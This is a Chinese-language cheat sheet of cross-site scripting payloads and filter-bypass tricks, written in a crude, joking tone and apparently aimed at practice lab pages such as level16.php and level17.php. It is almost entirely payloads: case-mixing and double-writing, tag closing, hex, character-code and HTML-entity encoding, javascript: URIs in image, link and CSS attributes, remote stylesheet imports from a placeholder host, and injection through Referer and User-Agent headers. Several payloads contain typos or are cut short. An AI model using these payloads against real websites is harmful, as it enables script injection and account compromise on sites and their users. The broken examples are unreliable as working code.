# XSS之王张禧

## **直接x他，x他🐎的！**

首先先打个经典代码试试看，虽然说90%不行，但是万一呢？对吧！

```
<script>alert('xss');</script>
```



## **如果有过滤**

输入：
```
< > ' " = ; 
```
字符查看一下，那些被过滤了，那些被转义了，那些被删除了。






## **大小写混写，双写绕过**

当一些敏感标签，如`script,img`中间被截断或者删除，可以尝试大小写混写，或者双写绕过:
```
<sCrIpT><>
<Imimgg><>
```






## **尝试闭合标签**

输入没什么过滤，但是无法直接弹窗可以尝试闭合标签然后使xss生效
比如：
```
"> <script>alert(1);</script>
```

## **如何绕过**

### **16进制编码绕过**
将XSS语句经过16进制编码转换来绕过XSS的规则。

列:
```
<script>alert(1)</script>
```
可以转换为
```
%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e
```

## **绕过PHP自带的安全设置**

在php中设置为`magic_quotes_gpc=ON`中安全设置开启，开启后会吧一些特殊字符进行转换，比如：`把'(单引号)转化为：`\`,双引号`"`转换为：``\"``

> 我们可以通过javascript中的`String.fromCharCode`方法来绕过

可以输入为：
```
<script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88,83, 83, 34, 41, 59)</script>
```

## **利用html标签属性值执行XSS**
很多HTML标记中的属性都支持JavaScript脚本，所以我反手给你个xss你怎么说？上号：
```
<img src = "javascript:alert(‘xss‘);">
```
其中只要执行了js代码就可以弹窗，如果引用文件都可以绕过`<>`





## **使用空格，TAB，回车，js编码绕过**
如果过滤时对`JavaScript`进行了过滤，得益于JS代码的**优秀体制**(**该用谁心理有B数了8**)只需要对js做小小的操作即可绕过：
```
<img src= "java　　script:alert(‘xss‘);" width=100>
```
或者：
```
<img src= "javascript:  alert(/xss/);" width=100>
```

或者：
```
<a herf="javascr&#69pt:alert(1)">



```

## **利用CSS跨站解析**
大概就是去在文章引入的CSS中加入一串XSS代码，应为CSS不用嵌入到html中，可以直接从文件或其他地方进行引用。
`但是 浏览器之间不能通用`
```
<div style = "list-style-image:url(javascript:alert(‘xSS‘))">

<link rel = "stylesheet" href ="http://www.xxx.com/atack.css">

<style type=‘text/css‘>@import url(http://www.xxx.com/xss.css);</style>

<style>@import ‘javascript:alert(‘xss‘);‘</style>
```

## **利用字符编码**
利用16进制转换，或者ASCII表转换来进行xss
```
<script>eval("\61\6c\65......");<script>
```

## **尝试在请求包中输入值查看是否被带入数值**

在请求值中尝试加入referer值

```
Referer: aaaa" type="text" onclick="alert(1)"
```
尝试在User-Agent等值中输入值查看是否能够带入数值

```
user=" type="text" onclick="alert(1)"
```

## **构造payload(采用%0a绕过空格过滤)**
如果过滤了`script、/、与空格`
在url中直接加入`%0a`绕过空格过滤
```
http://127.0.0.1/xss/level16.php?keyword=<img%0asrc=1%0aonerror=alert(1)>
```

## **如果过滤了双引号和尖括号**
html实体编码来过滤尖括号和双引号
```
http://IP/xss/level17.php?arg01=a&arg02=b onmouseover=alert(1)

```


